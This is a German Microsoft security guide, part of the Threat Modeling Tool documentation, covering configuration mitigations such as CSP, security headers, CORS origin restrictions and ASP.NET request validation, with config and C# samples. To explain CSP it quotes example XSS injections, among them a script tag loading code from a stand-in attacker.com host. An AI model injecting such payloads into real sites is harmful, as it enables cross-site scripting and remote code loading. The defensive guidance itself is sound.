---
title: Konfigurationsverwaltung – Microsoft Threat Modeling Tool – Azure | Microsoft-Dokumentation
description: Gegenmaßnahmen für durch das Threat Modeling Tool offengelegte Gefahren
services: security
documentationcenter: na
author: jegeib
manager: jegeib
editor: jegeib
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 02/07/2017
ms.author: jegeib
ms.openlocfilehash: 284d0e888b89d340088f770af22c026a861a4685
ms.sourcegitcommit: 41ca82b5f95d2e07b0c7f9025b912daf0ab21909
ms.translationtype: HT
ms.contentlocale: de-DE
ms.lasthandoff: 06/13/2019
ms.locfileid: "60610725"
---
# <a name="security-frame-configuration-management--mitigations"></a>Sicherheitskonzept: Konfigurationsverwaltung | Risikominderung 
| Produkt/Dienst | Artikel |
| --------------- | ------- |
| **Web Application** | <ul><li>[Implementieren Sie die Inhaltssicherheitsrichtlinie (Content Security Policy, CSP), und deaktivieren Sie Inline-JavaScript.](#csp-js)</li><li>[Aktivieren Sie die XSS-Filter des Browsers.](#xss-filter)</li><li>[ASP.NET-Anwendungen müssen vor der Bereitstellung die Ablaufverfolgung und das Debugging deaktivieren.](#trace-deploy)</li><li>[Greifen Sie nur auf Drittanbieter-JavaScripts aus vertrauenswürdigen Quellen zu.](#js-trusted)</li><li>[Stellen Sie sicher, dass authentifizierte ASP.NET-Seiten gegen UI Redressing und Clickjacking geschützt sind.](#ui-defenses)</li><li>[Stellen Sie sicher, dass nur vertrauenswürdige Ursprünge zulässig sind, wenn CORS für ASP.NET-Webanwendungen aktiviert ist.](#cors-aspnet)</li><li>[Aktivieren Sie für ASP.NET-Seiten das ValidateRequest-Attribut.](#validate-aspnet)</li><li>[Verwenden Sie die neuesten Versionen von JavaScript-Bibliotheken (lokal gehostet).](#local-js)</li><li>[Deaktivieren Sie die automatische MIME-Ermittlung.](#mime-sniff)</li><li>[Entfernen Sie Serverstandardheader für Windows Azure-Websites, um Fingerprinting zu vermeiden.](#standard-finger)</li></ul> |
| **Datenbank** | <ul><li>[Konfigurieren einer Windows-Firewall für Datenbank-Engine-Zugriff](#firewall-db)</li></ul> |
| **Web-API** | <ul><li>[Stellen Sie sicher, dass nur vertrauenswürdige Ursprünge zulässig sind, wenn CORS für die ASP.NET-Web-API aktiviert ist.](#cors-api)</li><li>[Verschlüsseln Sie Abschnitte der Web-API-Konfigurationsdateien, die sensible Daten enthalten.](#config-sensitive)</li></ul> |
| **IoT-Gerät** | <ul><li>[Stellen Sie sicher, dass alle Administratoroberflächen durch sichere Anmeldeinformationen geschützt sind.](#admin-strong)</li><li>[Stellen Sie sicher, dass auf Geräten kein unbekannter Code ausgeführt werden kann.](#unknown-exe)</li><li>[Verschlüsseln Sie die Betriebssystempartition und andere Partitionen des IoT-Geräts mit BitLocker.](#partition-iot)</li><li>[Stellen Sie sicher, dass auf Geräten nur unbedingt erforderliche Dienste/Features aktiviert sind.](#min-enable)</li></ul> |
| **Zwischengeschaltetes IoT-Gateway** | <ul><li>[Verschlüsseln Sie die Betriebssystempartition und andere Partitionen des zwischengeschalteten IoT-Gateways mit BitLocker.](#field-bit-locker)</li><li>[Stellen Sie sicher, dass die Standardanmeldeinformationen des zwischengeschalteten Gateways bei der Installation geändert werden.](#default-change)</li></ul> |
| **IoT-Cloudgateway** | <ul><li>[Stellen Sie sicher, dass das Cloudgateway einen Prozess implementiert, der die Firmware verbundener Geräte auf dem neuesten Stand hält.](#cloud-firmware)</li></ul> |
| **Computer-Vertrauensstellungsgrenze** | <ul><li>[Stellen Sie sicher, dass für Geräte organisationsrichtlinienkonforme Endpunktsicherheitskontrollen konfiguriert sind.](#controls-policies)</li></ul> |
| **Azure Storage (in englischer Sprache)** | <ul><li>[Gewährleisten Sie die sichere Verwaltung von Azure-Speicherzugriffsschlüsseln.](#secure-keys)</li><li>[Stellen Sie sicher, dass nur vertrauenswürdige Ursprünge zulässig sind, wenn CORS für Azure Storage aktiviert ist.](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Aktivieren Sie das Diensteinschränkungsfeature von WCF.](#throttling)</li><li>[Offenlegung von WCF-Informationen durch Metadaten](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementieren Sie die Inhaltssicherheitsrichtlinie (Content Security Policy, CSP), und deaktivieren Sie Inline-JavaScript.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | [An Introduction to Content Security Policy](https://www.html5rocks.com/en/tutorials/security/content-security-policy/) (Eine Einführung in die Inhaltssicherheitsrichtlinie), [Content Security Policy Reference](https://content-security-policy.com/) (Referenz für die Inhaltssicherheitsrichtlinie), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/) (Sicherheitsfeatures), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) (Einführung in die Inhaltssicherheitsrichtlinie), [Can I use CSP?](https://caniuse.com/#feat=contentsecuritypolicy) (Kann ich die Inhaltssicherheitsrichtlinie verwenden?) |
| **Schritte** | <p>Die Inhaltssicherheitsrichtlinie (Content Security Policy, CSP) ist ein umfassender defensiver Sicherheitsmechanismus – ein W3C-Standard, mit dem Besitzer von Webanwendungen den in Ihre Website eingebetteten Inhalt steuern können. CSP wird auf dem Webserver als HTTP-Antwortheader hinzugefügt und clientseitig vom Browser erzwungen. Die Richtlinie basiert auf einer Positivliste: Eine Website kann einen Satz vertrauenswürdiger Domänen deklarieren, aus denen aktive Inhalte wie etwa JavaScript geladen werden können.</p><p>CSP bietet folgende Sicherheitsvorteile:</p><ul><li>**Schutz vor XSS**:  Wenn eine Seite für XSS anfällig ist, kann dies von einem Angreifer auf zwei Arten ausgenutzt werden:<ul><li>Der Angreifer kann `<script>malicious code</script>` einschleusen. Dieser Exploit funktioniert dank der Basiseinschränkung 1 von CSP nicht.</li><li>Der Angreifer kann `<script src=”http://attacker.com/maliciousCode.js”/>` einschleusen. Dieser Exploit funktioniert nicht, da die vom Angreifer gesteuerte Domäne nicht in der CSP-Positivliste mit zulässigen Domänen enthalten ist.</li></ul></li><li>**Kontrolle über die Ausschleusung von Daten**: Wenn schädlicher Inhalt auf einer Webseite versucht, eine Verbindung mit einer externen Website herzustellen und Daten zu stehlen, wird die Verbindung von CSP getrennt. Der Grund: Die Zieldomäne ist nicht in der Positivliste von CSP enthalten.</li><li>**Schutz vor Clickjacking:** Bei einem Clickjacking-Angriff kann ein Angreifer eine Originalwebsite mit einem Frame versehen und Benutzer zum Klicken auf Benutzeroberflächenelemente bewegen. Zum Schutz vor Clickjacking wird momentan ein Antwortheader mit X-Frame-Optionen konfiguriert. Dieser Header wird nicht von allen Browsern beachtet, und in Zukunft wird CSP als eine der Standardmaßnahmen gegen Clickjacking verwendet.</li><li>**Echtzeitberichte zu Angriffen**: Bei einem Einschleusungsangriff auf eine CSP-fähige Website benachrichtigt der Browser automatisch einen für den Webserver konfigurierten Endpunkt. Somit fungiert CSP als Echtzeitwarnsystem.</li></ul> |

### <a name="example"></a>Beispiel
Beispielrichtlinie: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Bei dieser Richtlinie können Skripts nur vom Server der Webanwendung und vom Google Analytics-Server geladen werden. Von anderen Websites geladene Skripts werden abgelehnt. Wenn CSP auf einer Website aktiviert ist, werden folgende Features automatisch deaktiviert, um XSS-Angriffe zu vermeiden. 

### <a name="example"></a>Beispiel
Es werden keine Inlineskripts ausgeführt. Beispiele für Inlineskripts: 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Beispiel
Zeichenfolgen werden nicht als Code ausgewertet. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Aktivieren Sie die XSS-Filter des Browsers.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | [XSS Protection Filter](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) (XSS-Schutzfilter) |
| **Schritte** | <p>Die Konfiguration des X-XSS-Protection-Antwortheaders steuert den websiteübergreifenden Skriptfilter des Browsers. Dieser Antwortheader kann folgende Werte besitzen:</p><ul><li>`0:`: Deaktiviert den Filter.</li><li>`1: Filter enabled`: Wenn ein Angriff mit websiteübergreifendem Skripting erkannt wird, wird die Seite vom Browser bereinigt, um den Angriff abzuwehren.</li><li>`1: mode=block : Filter enabled`: Bei Erkennung eines XSS-Angriffs verhindert der Browser das Rendern der Seite, anstatt die Seite zu bereinigen.</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. Der Browser bereinigt die Seite und meldet die Verletzung.</li></ul><p>Hierbei handelt es sich um eine Chromium-Funktion, die CSP-Verletzungsberichte verwendet, um Details an einen URI Ihrer Wahl zu senden. Die letzten beiden Optionen werden als sichere Werte betrachtet.</p>|

## <a id="trace-deploy"></a>ASP.NET-Anwendungen müssen vor der Bereitstellung die Ablaufverfolgung und das Debugging deaktivieren.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | [Übersicht über das ASP.NET-Debugging](https://msdn.microsoft.com/library/ms227556.aspx), [Übersicht über die ASP.NET-Ablaufverfolgung](https://msdn.microsoft.com/library/bb386420.aspx), [Vorgehensweise: Aktivieren der Ablaufverfolgung für eine ASP.NET-Anwendung](https://msdn.microsoft.com/library/0x5wc973.aspx), [Vorgehensweise: Aktivieren des Debuggens von ASP.NET-Anwendungen](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Schritte** | Wenn die Ablaufverfolgung für die Seite aktiviert ist, erhält jeder Browser, der die Seite anfordert, auch die Ablaufverfolgungsinformationen, die Daten zum internen Serverzustand und zum Workflow enthalten. Diese Informationen sind möglicherweise sicherheitsrelevant. Wenn das Debuggen für die Seite aktiviert ist, führen Fehler auf dem Server dazu, dass der Browser die vollständigen Daten der Stapelüberwachung erhält. Diese Daten enthalten möglicherweise sicherheitsrelevante Informationen zum Workflow des Servers. |

## <a id="js-trusted"></a>Greifen Sie nur auf Drittanbieter-JavaScripts aus vertrauenswürdigen Quellen zu.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | N/V  |
| **Schritte** | Auf Drittanbieter-JavaScripts darf nur verwiesen werden, wenn diese aus vertrauenswürdigen Quellen stammen. Die Verweisendpunkte müssen immer SSL verwenden. |

## <a id="ui-defenses"></a>Stellen Sie sicher, dass authentifizierte ASP.NET-Seiten gegen UI Redressing und Clickjacking geschützt sind.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | [OWASP Clickjacking Defense Cheat Sheet](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet) (OWASP-Cheat Sheet zur Abwehr von Clickjacking), [IE Internals - Combating ClickJacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) (IE intern – Abwehren von Clickjacking mit X-Frame-Optionen) |
| **Schritte** | <p>Beim Clickjacking (oder UI Redressing) verwendet ein Angreifer mehrere transparente oder undurchsichtige Ebenen, um einen Benutzer dazu zu bringen, auf eine Schaltfläche oder auf einen Link auf einer anderen Seite zu klicken, obwohl der Benutzer eigentlich mit der Seite auf der obersten Ebene interagieren wollte.</p><p>Zur Erstellung dieser Ebenenstruktur wird eine schädliche Seite mit einem IFrame erstellt, der die Seite des Opfers lädt. Dadurch „kapert“ der Angreifer Klicks, die eigentlich für die ursprüngliche Seite gedacht waren, und leitet sie auf eine andere Seite um, die wahrscheinlich zu einer anderen Anwendung und/oder zu einer anderen Domäne gehört. Legen Sie zur Verhinderung von Clickjacking-Angriffen die richtigen X-Frame-Options-HTTP-Antwortheader fest, die den Browser anweisen, kein Framing von anderen Domänen zuzulassen.</p>|

### <a name="example"></a>Beispiel
Der X-FRAME-OPTIONS-Header kann über „web.config“ von IIS festgelegt werden. Codeausschnitt aus „web.config“ für Websites, die niemals mit einem Frame versehen werden dürfen: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Beispiel
Codeausschnitt aus „web.config“ für Websites, die nur von Seiten aus der gleichen Domäne mit einem Frame versehen werden dürfen: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Stellen Sie sicher, dass nur vertrauenswürdige Ursprünge zulässig sind, wenn CORS für ASP.NET-Webanwendungen aktiviert ist.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Web Forms, MVC5 |
| **Attribute**              | N/V  |
| **Referenzen**              | N/V  |
| **Schritte** | <p>Die Browsersicherheit verhindert, dass eine Webseite AJAX-Anforderungen an eine andere Domäne richtet. Diese Einschränkung wird als Richtlinie des gleichen Ursprungs bezeichnet und verhindert, dass eine schädliche Website sensible Daten von einer anderen Website liest. Manchmal müssen jedoch unter Umständen APIs sicher verfügbar gemacht werden, damit sie von anderen Websites genutzt werden können. CORS (Cross Origin Resource Sharing; Ressourcenfreigabe zwischen verschiedenen Ursprüngen) ist ein W3C-Standard, der einem Server eine weniger strenge Anwendung der Richtlinie des gleichen Ursprungs ermöglicht. Mit CORS kann ein Server explizit einige ursprungsübergreifende Anforderungen zulassen und andere ablehnen.</p><p>CORS ist sicherer und flexibler als frühere Techniken wie etwa JSONP. Durch die Aktivierung von CORS werden der Webanwendung im Grunde einige HTTP-Antwortheader (Access-Control-*) hinzugefügt. Dies ist auf mehrere Arten möglich.</p>|

### <a name="example"></a>Beispiel
Wenn der Zugriff auf „web.config“ möglich ist, kann CORS über den folgenden Code hinzugefügt werden: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="https://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Beispiel
Wenn der Zugriff auf „web.config“ nicht möglich ist, kann CORS durch Hinzufügen des folgenden CSharp-Codes konfiguriert werden: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
```

Stellen Sie unbedingt sicher, dass die Liste mit Ursprüngen im Attribut „Access-Control-Allow-Origin“ auf eine begrenzte Anzahl vertrauenswürdiger Ursprünge festgelegt ist. Ist dieser Aspekt nicht ordnungsgemäß konfiguriert (also der Wert beispielsweise auf „*“ festgelegt), können schädliche Websites ursprungsübergreifende Anforderungen ohne jegliche Einschränkungen an die Webanwendung richten, wodurch die Anwendung für CSRF-Angriffe anfällig wird. 

## <a id="validate-aspnet"></a>Aktivieren Sie für ASP.NET-Seiten das ValidateRequest-Attribut.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Web Forms, MVC5 |
| **Attribute**              | N/V  |
| **Referenzen**              | [Request Validation - Preventing Script Attacks](https://www.asp.net/whitepapers/request-validation) (Anforderungsüberprüfung – Verhindern von Skriptangriffen) |
| **Schritte** | <p>Das Anforderungsüberprüfungsfeature von ASP.NET ist seit Version 1.1 verfügbar und verhindert, dass der Server Inhalte mit nicht codierter HTML akzeptiert. Dieses Feature dient zur Abwehr von Skripteinschleusungsangriffen, bei denen Clientskriptcode oder HTML unbewusst an einen Server übermittelt, gespeichert und anschließend anderen Benutzern angezeigt werden kann. Es wird weiterhin dringend empfohlen, sämtliche Eingabedaten zu überprüfen und gegebenenfalls als HTML zu codieren.</p><p>Bei der Anforderungsüberprüfung werden sämtliche Eingabedaten mit einer Liste potenziell gefährlicher Werte verglichen. Im Falle einer Übereinstimmung löst ASP.NET Folgendes aus: `HttpRequestValidationException`. Das Anforderungsüberprüfungsfeature ist standardmäßig aktiviert.</p>|

### <a name="example"></a>Beispiel
Dieses Feature kann jedoch auf Seitenebene deaktiviert werden: 
```XML
<%@ Page validateRequest="false" %> 
```
Oder auf Anwendungsebene: 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Hinweis: Das Anforderungsüberprüfungsfeature wird nicht unterstützt und ist nicht Teil der MVC6-Pipeline. 

## <a id="local-js"></a>Verwenden Sie die neuesten Versionen von JavaScript-Bibliotheken (lokal gehostet).

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | N/V  |
| **Schritte** | <p>Entwickler, die mit standardmäßigen JavaScript-Bibliotheken wie JQuery arbeiten, müssen genehmigte Versionen gängiger JavaScript-Bibliotheken verwenden, die keine bekannten Sicherheitsmängel enthalten. Es empfiehlt sich, stets die neueste Version der Bibliotheken zu verwenden, da sie Sicherheitsfixes für bekannte Sicherheitsrisiken aus älteren Versionen enthalten.</p><p>Falls die neueste Version aus Kompatibilitätsgründen nicht verwendet werden kann, sollten folgende Mindestversionen verwendet werden.</p><p>Akzeptable Mindestversionen:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Validate 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery Cycle 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX Control Toolkit**<ul><li>AJAX Control Toolkit 40412</li></ul></li><li>**ASP.NET-Web Forms und AJAX**<ul><li>ASP.NET-Web Forms und AJAX 4</li><li>ASP.NET AJAX 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Laden Sie niemals eine JavaScript-Bibliothek von externen Websites (beispielsweise von öffentlichen CDNs).</p>|

## <a id="mime-sniff"></a>Deaktivieren Sie die automatische MIME-Ermittlung.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | N/V  |
| **Referenzen**              | [IE8 Security Part V: Comprehensive Protection](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx) (IE8-Sicherheit Teil V: Umfassender Schutz), [MIME-Typ](https://en.wikipedia.org/wiki/Mime_type) |
| **Schritte** | Der Header „X-Content-Type-Options“ ist ein HTTP-Header, mit dem Entwickler festlegen, dass für ihre Inhalte keine MIME-Ermittlung erfolgen soll. Dieser Header ist als Gegenmaßnahme für MIME-Ermittlungsangriffe konzipiert. Für jede Seite, die möglicherweise von Benutzern steuerbare Inhalte enthält, muss der HTTP-Header „X-Content-Type-Options:nosniff“ verwendet werden. Verwenden Sie eines der folgenden Verfahren, um den erforderlichen Header global für alle Seiten in der Anwendung zu aktivieren:|

### <a name="example"></a>Beispiel
Fügen Sie den Header der Datei „web.config“ hinzu, wenn die Anwendung von Internet Information Services (IIS; ab Version 7) gehostet wird. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Beispiel
Fügen Sie den Header über die globale Anforderung „Application\_BeginRequest“ hinzu. 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Beispiel
Implementieren Sie ein benutzerdefiniertes HTTP-Modul. 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Beispiel
Sie können den erforderlichen Header für bestimmte Seiten aktivieren, indem sie ihn einzelnen Antworten hinzufügen: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Entfernen Sie Serverstandardheader für Windows Azure-Websites, um Fingerprinting zu vermeiden.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Webanwendung. | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | Allgemein |
| **Attribute**              | EnvironmentType: Azure |
| **Referenzen**              | [Removing standard server headers on Windows Azure Web Sites](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) (Entfernen von Serverstandardheadern für Windows Azure-Websites) |
| **Schritte** | Header wie „Server“, „X-Powered-By“ und „X-AspNet-Version“ geben Informationen zum Server und zu den zugrunde liegenden Technologien preis. Es empfiehlt sich, diese Header zu unterdrücken, um das Fingerprinting der Anwendung zu verhindern. |

## <a id="firewall-db"></a>Konfigurieren Sie eine Windows-Firewall für Datenbankmodulzugriff.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Datenbank | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | SQL Azure, lokal |
| **Attribute**              | N/V, SQL-Version: V12 |
| **Referenzen**              | [Übersicht über Firewallregeln für Azure SQL-Datenbank](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Konfigurieren einer Windows-Firewall für Datenbank-Engine-Zugriff](https://msdn.microsoft.com/library/ms175043) |
| **Schritte** | Firewallsysteme tragen dazu bei, nicht autorisierte Zugriffe auf Computerressourcen zu verhindern. Wenn Sie durch eine Firewall auf eine Instanz der SQL Server-Datenbank-Engine zugreifen möchten, müssen Sie die Firewall auf dem Computer, auf dem SQL Server ausgeführt wird, entsprechend konfigurieren. |

## <a id="cors-api"></a>Stellen Sie sicher, dass nur vertrauenswürdige Ursprünge zulässig sind, wenn CORS für die ASP.NET-Web-API aktiviert ist.

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Web-API | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | MVC 5 |
| **Attribute**              | N/V  |
| **Referenzen**              | [Enabling Cross-Origin Requests in ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api) (Ermöglichen ursprungsübergreifender Anforderungen in der ASP.NET-Web-API 2), [ASP.NET-Web-API – CORS-Unterstützung in der ASP.NET-Web-API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Schritte** | <p>Die Browsersicherheit verhindert, dass eine Webseite AJAX-Anforderungen an eine andere Domäne richtet. Diese Einschränkung wird als Richtlinie des gleichen Ursprungs bezeichnet und verhindert, dass eine schädliche Website sensible Daten von einer anderen Website liest. Manchmal müssen jedoch unter Umständen APIs sicher verfügbar gemacht werden, damit sie von anderen Websites genutzt werden können. CORS (Cross Origin Resource Sharing; Ressourcenfreigabe zwischen verschiedenen Ursprüngen) ist ein W3C-Standard, der einem Server eine weniger strenge Anwendung der Richtlinie des gleichen Ursprungs ermöglicht.</p><p>Mit CORS kann ein Server explizit einige ursprungsübergreifende Anforderungen zulassen und andere ablehnen. CORS ist sicherer und flexibler als frühere Techniken wie etwa JSONP.</p>|

### <a name="example"></a>Beispiel
Fügen Sie den folgenden Code in „App_Start/WebApiConfig.cs“ der Methode „WebApiConfig.Register“ hinzu: 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Beispiel
Das EnableCors-Attribut kann wie folgt auf Aktionsmethoden in einem Controller angewendet werden: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Stellen Sie unbedingt sicher, dass die Liste mit Ursprüngen im EnableCors-Attribut auf eine begrenzte Anzahl vertrauenswürdiger Ursprünge festgelegt ist. Ist dieser Aspekt nicht ordnungsgemäß konfiguriert (also der Wert beispielsweise auf „*“ festgelegt), können schädliche Websites ursprungsübergreifende Anforderungen ohne jegliche Einschränkungen an die API richten, wodurch die API für CSRF-Angriffe anfällig wird. EnableCors kann auf Controllerebene ausgestattet werden. 

### <a name="example"></a>Beispiel
Wenn Sie CORS für eine bestimmte Methode in einer Klasse deaktivieren möchten, kann das DisableCors-Attribut wie folgt verwendet werden: 
```csharp
[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Komponente**               | Web-API | 
| **SDL-Phase**               | Entwickeln |  
| **Zutreffende Technologien** | MVC 6 |
| **Attribute**              | N/V  |
| **Referenzen**              | [Enabling Cross-Origin Requests (CORS) in ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) (Aktivieren von CORS in ASP.NET Core 1.0) |
| **Schritte** | <p>In ASP.NET Core 1.0 kann CORS entweder mithilfe von Middleware oder mithilfe von MVC aktiviert werden. Bei Verwendung von MVC werden die gleichen CORS-Dienste verwendet, aber nicht die CORS-Middleware.</p>|

**Vorgehensweise 1**: Aktivieren von CORS mithilfe von Middleware: Wenn Sie CORS für die gesamte Anwendung aktivieren möchten, fügen Sie die CORS-Middleware mithilfe der UseCors-Erweiterungsmethode der Anforderungspipeline hinzu. Beim Hinzufügen der CORS-Middleware kann mithilfe der CorsPolicyBuilder-Klasse eine ursprungsübergreifende Richtlinie angegeben werden. Dies kann auf zwei Arten erreicht werden:

### <a name="example"></a>Beispiel
Das erste Beispiel dient zum Aufrufen von „UseCors“ mit einem Lambda. Das Lambda akzeptiert ein CorsPolicyBuilder-Objekt: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("https://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Beispiel
Das zweite Beispiel dient dazu, mindestens eine benannte CORS-Richtlinie zu definieren und anschließenden zur Laufzeit anhand des Namens auszuwählen. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("https://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Vorgehensweise 2**: Aktivieren von CORS in MVC: Entwickler können alternativ MVC verwenden, um bestimmte CORS pro Aktion, pro Controller oder global für alle Controller anzuwenden.

### <a name="example"></a>Beispiel
Pro Aktion: Fügen Sie einer Aktion das EnableCors-Attribut hinzu, um eine CORS-Richtlinie für eine bestimmte Aktion anzugeben. Geben Sie den Namen der Richtlinie an. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Beispiel
Pro Controller: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Beispiel
Global: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
